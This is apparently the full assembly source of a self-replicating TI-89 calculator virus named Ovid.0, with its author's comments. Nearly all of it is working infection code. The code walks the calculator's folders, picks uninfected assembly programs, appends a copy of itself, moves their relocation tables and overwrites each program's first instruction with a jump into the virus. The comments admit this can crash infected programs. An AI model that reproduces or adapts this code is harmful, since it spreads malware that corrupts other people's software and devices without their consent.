;; The Slimey's First Viral Code: Ovid.0
	;; Features:
	;; * Adds self to end of file
	;; * Moves relocation table
	;; * Signature detection: constant string "slythe".
	;; * Smaller than Ovid.1
	;; * May not work!
	
	xdef	_ti89
	xdef	_main
	xdef	_nostub
	include "tios.h"
	
	;; Using this instead of ROM_CALL saves me 32 bytes.  (!)
	;; a5 _must_ be set to ($c8) before using RC.
RC	MACRO
	move.l	\1*4(a5),a0
	jsr	(a0)
	ENDM
	
SIZE	equ	234
	
front:	
	;; This should be the very first instruction in the program.
_main:	movem.l	a0-a6/d0-d7,-(a7)	; save regs
	link	a6,#0
	move.l	($c8),a5
	
	;; Proceed on to the infection routine!
	;; Searches for files, gives them to do_f (inlined)
infect:	
	;; If we DON'T lock the folder tables, SymFindNext will give
	;; us badness rather than the nice juicy pointers that we
	;; want.
	
	move.w	#$81,-(a7)	; $81 == flag to lock all folders
	clr.l	-(a7)
	RC	FolderOp	; returns 1 on success, 0 otherwise
	tst.w	d0
	beq	unlock		; failure locking (FolderOp gave us NULL)
	
	move.w	#$06,-(a7)	; $06 == FO_RECURSE | FO_SKIP_TEMPS
	clr.l	-(a7)
	RC	SymFindFirst
	;; A pointer to a SYM_ENTRY structure is now in A0.  There has
	;; to be at least one variable on the calculator (because
	;; otherwise this would not be being run).
	
	;; infection loop
ilp:	
	move.w	10(a0),d6	; Put flags in D6
	andi.w	#$06C8,d6	; Mask in all the undesirable attributes.
	;; $06C8 == SF_TWIN | SF_ARCHIVED | SF_FOLDER | SF_OVERWRITTEN | SF_LOCKED
	bne	next		; File is unsuitable --- some flags are 1.
	move.w	12(a0),-(a7)	; push handle from SYM_ENTRY structure
	RC	HeapDeref	; measured at only 62 cycles!
	move.w	(a7)+,d5
	;; A pointer to the file is now in A0.
	;; This is smaller than exg-tst-exg.
	addq.l	#1,a0
	subq.l	#1,a0
	beq	next		; we're done for some reason--
				; HeapDeref gave us NULL.
	
	;; Check if a file is infected.  Wants A0 == pointer to start of file.
	;; Returns D0 == 0 if not infectable, D0 == length if OK.
	;; Also returns A1 == pointer to end-of-file tag byte.
chkinf:	clr.l	d7
	move.w	(a0),d7		; D7 has length of file+1, not incl size word
	move.l	d7,d6		; preserve the filesize
	lea	1(a0,d7.l),a1	; A1 now has end-of-file.
	cmp.b	#$F3,(a1)	; $F3 == ASM_TAG
	bne	next		; If taken: not ASM.
	move.l	sig2(PC),d1
bloop:	tst.w	-(a1)		; find the beginning of the
	bne	bloop		;  relocation table
	cmp.l	-(a1),d1	; sig is long before null at start of
				;  relocation table
rats:	beq	next		; file is already dirty, skip it.
	;; chkinf ends
	
	;; Infect it.
	;; Register summary at this point:
	;; A0 == pointer to start of file
	;; D7 == length of file == (A0)
	;; D5 == handle of file
	
	;; infect a file.
	;; Wants:
	;; D5 == handle of file
	;; D7 == length of file
do_f:	add.w	#SIZE+2,d7
	move.l	d7,-(a7)	; new size (why does TIOS want a long?)
	move.w	d5,-(a7)
	RC	HeapRealloc
	tst.w	d0		; If we have $0000, then reallocation
	beq	next		; failed.  So skip this file.
	
	move.w	d0,-(a7)
	RC	HeapDeref
	
	;; The address of the start of the possibly moved file is now
	;; in A0.
	
	move.w	d7,(a0)+	; add our size to its size.
	
	;; Load end-of-new-file into A4.
	lea	-1(a0,d7.w),a4
	
	;; Load end-of-old-file into A1.
	lea	1(a0,d6.w),a1
	
	;; -2(a1).b is now $F3.
	
	;; Move the relocation table to the end of the file.
	
reloop:	move.w	-(a1),-(a4)
	bne	reloop		; If taken: we moved a nonzero word.
	
	;; Copy myself.
	move.l	a1,a3
	addq.l	#2,a3
	move.w	#((SIZE)/2),d2
	lea	_main(PC),a4	; Where slythe.1 starts.
cloop:	move.w	(a4)+,(a3)+
	dbf	d2,cloop
	
	;; This is the fiddly part.
	
	;; Take one whole instruction from the very beginning of the
	;; program and replace it with a BSR to my code.  Then put the
	;; instruction from the beginning of the program into a buffer
	;; and add appropriate glue.  Of course, the instruction moved
	;; must be exactly 2 words long, otherwise the program crashes
	;; somewhat spectacularly when run.
	
	;; Please note that that is the only real adverse effect of
	;; this program. :D  Hopefully, it's the only visible effect
	;; as well.
	
	;; TERMS:
	;;  file == that which is being infected.
	;;    me == this running copy of slythe.1.
	;; spawn == the copy (of me) being appended to file.
	
	;; Register summary at this point:
	;; D0 == handle of file.
	;; D2 == -1
	;; D6 == length of old file.
	;; D7 == length of new file.
	;; A0 == pointer to first byte of file.
	;; A1 == pointer to _main in spawn.
	;; A2 == scratch (ptr to somewhere near stack)
	;; A3 == pointer to end of spawn.
	;; A4 == pointer to end of me.
	
	;; Subtract 4 from D6.  This is thus the distance from the
	;; instruction after the BRA in the beginning of the file to
	;; _main in the spawn.
	subq	#4,d6
	
	;; Load the address of scrat in the spawn, where the first
	;; instruction from the file should go in order to be
	;; executed.
	lea	2+scrat-_main(a1),a3
	
	;; Move the first instruction, which is assumed to be 4 bytes
	;; (a long) and put it in the scrat space of the spawn.  If
	;; the first four bytes are two instructions, fine.  If an
	;; instruction can't fit in them, bummer.  Calc crashes.
	;; Can't beat this for simplicity, though.
	move.l	(a0),(a3)+
	
	;; Copy the BRA opcode from strap to the file.  The BRA copied
	;; is from this running copy of the virus, but only for
	;; simplicity.  (It would not be smaller to code it as an
	;; immediate value.)
	move.w	strap(PC),(a0)+
	
	;; Put the offset from BRA in the file to _main in the spawn
	;; into the offset word following the BRA.
	move.l	a1,a4		; A1 is the starting point of the
				; spawn.
	suba.l	a0,a4
	addq.w	#2,a4		; check???
	move.w	a4,(a0)+	; Writes the value into the blank
				; after BRA in the beginning of the
				; file.
	
	;; Load the location of targ in spawn relative to A1, which
	;; has the address of _main in spawn.
	lea	targ-_main(a1),a4
	
	;; Set the offset in D6.  This is the distance in bytes from
	;; targ in the spawn to the word after $6000xxxx in the
	;; beginning of the file.
	
	move.l	a0,d6
	sub.l	a4,d6		; A4 is larger, so this is negative.
	
	;; Load the offset from D6 (see above) into targ of spawn.
	;; This is negative so that the offset is negative, to jump
	;; *backwards* in memory.
	move.w	d6,(a4)
	
	;; Go to the next file.
next:	
	RC	SymFindNext
	addq.l	#1,a0		; cheaper than
	subq.l	#1,a0		; exg-tst-exg.
	bne	ilp
	
unlock:	
	move.w	#$80,-(a7)	; flag to unlock all folders, name == NULL
	clr.l	-(a7)
	RC	FolderOp	; if it fails, so what?
quit:	
	
	;; TODO:
	;; 
	;; Swap scrat with the BRA at the beginning of the file, then JSR
	;; to the first instruction of the file.  Then do the switcheroo
	;; again and RTS to the AMS.  (Credit for this ingenious scheme
	;; goes to Alex Cho Snyder.)
	;; 
	;; This is the Right Thing To Do because it guarantees the
	;; program will work whether or not the first instruction fits
	;; into scrat.
	;; 
	;; Why didn't I think of it?  Alex is a genius.
	
	;; leave the program, continue with life
	unlk	a6
go:	movem.l (a7)+,a0-a6/d0-d7	; restore regs
scrat:	nop			; Will be written to and changed.
	rts
	
	;; "strap" == "bootstrap"
	;; "targ" == "target"
strap:	dc.w	$6000		; The BRA opcode.
targ:	dc.w	$0002		; The offset.  I want to put d6+4 in this.
	
sig2:	dc.l	"ovid"
end:	